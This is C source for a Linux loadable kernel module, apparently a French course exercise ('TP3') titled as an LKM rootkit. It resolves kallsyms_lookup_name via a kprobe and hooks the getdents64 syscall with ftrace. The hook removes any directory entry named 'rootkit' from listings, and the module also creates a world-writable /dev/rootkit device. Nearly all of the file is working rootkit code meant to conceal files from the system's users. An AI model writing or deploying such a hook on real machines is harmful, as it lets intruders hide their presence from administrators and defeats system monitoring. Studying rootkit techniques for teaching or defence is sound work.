#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/errno.h>

#define HIDDEN_NAME "rootkit"

/*
 * Structure équivalente à linux_dirent64 utilisée par
 * getdents64().
 */
struct my_linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

/*
 * Pointeur vers kallsyms_lookup_name().
 */
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name);

/*
 * Récupération de kallsyms_lookup_name via kprobe.
 */
static int resolve_kallsyms_lookup_name(void)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };

    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("hidemod: impossible de trouver kallsyms_lookup_name\n");
        return ret;
    }

    kallsyms_lookup_name_ptr =
        (void *)kp.addr;

    unregister_kprobe(&kp);

    if (!kallsyms_lookup_name_ptr) {
        pr_err("hidemod: kallsyms_lookup_name introuvable\n");
        return -ENOENT;
    }

    return 0;
}

/*
 * Structure représentant notre hook ftrace.
 */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

static struct ftrace_hook getdents_hook;

/*
 * Fonction originale getdents64().
 */
static asmlinkage long (*real_getdents64)(
    const struct pt_regs *regs
);

/*
 * Fonction appelée par ftrace.
 */
static void notrace ftrace_thunk(
    unsigned long ip,
    unsigned long parent_ip,
    struct ftrace_ops *ops,
    struct ftrace_regs *fregs)
{
    struct pt_regs *regs;

    /*
     * Empêche le hook de se rappeler lui-même.
     */
    if (within_module(parent_ip, THIS_MODULE))
        return;

    regs = ftrace_get_regs(fregs);

    if (regs)
        regs->ip = (unsigned long)ops->private;
}

/*
 * Installation d'un hook ftrace.
 */
static int install_ftrace_hook(struct ftrace_hook *hook)
{
    int ret;

    hook->address = kallsyms_lookup_name_ptr(hook->name);

    if (!hook->address) {
        pr_err("hidemod: symbole %s introuvable\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->original) = hook->address;

    hook->ops.func = ftrace_thunk;
    hook->ops.flags =
        FTRACE_OPS_FL_SAVE_REGS |
        FTRACE_OPS_FL_IPMODIFY;

    hook->ops.private = hook->function;

    ret = ftrace_set_filter_ip(
        &hook->ops,
        hook->address,
        0,
        0
    );

    if (ret) {
        pr_err("hidemod: ftrace_set_filter_ip() = %d\n", ret);
        return ret;
    }

    ret = register_ftrace_function(&hook->ops);

    if (ret) {
        pr_err("hidemod: register_ftrace_function() = %d\n", ret);

        ftrace_set_filter_ip(
            &hook->ops,
            hook->address,
            1,
            0
        );

        return ret;
    }

    pr_info("hidemod: hook ftrace installé sur %s\n",
            hook->name);

    return 0;
}

/*
 * Suppression du hook ftrace.
 */
static void remove_ftrace_hook(struct ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);

    ftrace_set_filter_ip(
        &hook->ops,
        hook->address,
        1,
        0
    );

    pr_info("hidemod: hook ftrace supprimé\n");
}

/*
 re remplacement de getdents64().
 */
static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    long ret;
    unsigned int fd;
    void __user *dirent;
    unsigned int count;
    char *kernel_buffer;
    unsigned long bpos = 0;

    fd = (unsigned int)regs->di;
    dirent = (void __user *)regs->si;
    count = (unsigned int)regs->dx;

    ret = real_getdents64(regs);

    if (ret <= 0)
        return ret;

    kernel_buffer = kzalloc(ret, GFP_KERNEL);

    if (!kernel_buffer)
        return ret;

    if (copy_from_user(kernel_buffer, dirent, ret)) {
        kfree(kernel_buffer);
        return ret;
    }

    while (bpos < ret) {
        struct my_linux_dirent64 *cur;
        unsigned short reclen;

        cur = (struct my_linux_dirent64 *)(kernel_buffer + bpos);

        reclen = cur->d_reclen;

        if (reclen < sizeof(struct my_linux_dirent64) ||
            bpos + reclen > ret)
            break;

        if (strcmp(cur->d_name, HIDDEN_NAME) == 0) {

            memmove(
                cur,
                (char *)cur + reclen,
                ret - bpos - reclen
            );

            ret -= reclen;

            pr_info_ratelimited(
                "hidemod: entrée '%s' masquée\n",
                HIDDEN_NAME
            );

            continue;
        }

        bpos += reclen;
    }

    if (copy_to_user(dirent, kernel_buffer, ret)) {
        kfree(kernel_buffer);
        return -EFAULT;
    }

    kfree(kernel_buffer);

    return ret;
}

/*
 * Périphérique /dev/rootkit.
 */
static const struct file_operations rootkit_fops = {
    .owner = THIS_MODULE,
};

static struct miscdevice rootkit_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "rootkit",
    .fops = &rootkit_fops,
    .mode = 0666,
};

/*
 * Initialisation du module.
 */
static int __init hidemod_init(void)
{
    int ret;

    /*
     * Création de /dev/rootkit.
     */
    ret = misc_register(&rootkit_device);

    if (ret) {
        pr_err("hidemod: impossible d'enregistrer rootkit\n");
        return ret;
    }

    /*
     * Résolution de kallsyms_lookup_name().
     */
    ret = resolve_kallsyms_lookup_name();

    if (ret) {
        misc_deregister(&rootkit_device);
        return ret;
    }

    /*
     * On utilise le nom du symbole du syscall
     * présent sur les noyaux x86_64 modernes.
     */
    getdents_hook.name = "__x64_sys_getdents64";
    getdents_hook.function = hooked_getdents64;
    getdents_hook.original = &real_getdents64;

    ret = install_ftrace_hook(&getdents_hook);

    if (ret) {
        misc_deregister(&rootkit_device);
        return ret;
    }

    pr_info("hidemod: module chargé\n");

    return 0;
}

/*
 * Nettoyage du module.
 */
static void __exit hidemod_exit(void)
{
    remove_ftrace_hook(&getdents_hook);

    misc_deregister(&rootkit_device);

    pr_info("hidemod: module déchargé\n");
}

module_init(hidemod_init);
module_exit(hidemod_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TP3");
MODULE_DESCRIPTION("TP3 - LKM rootkit avec ftrace");

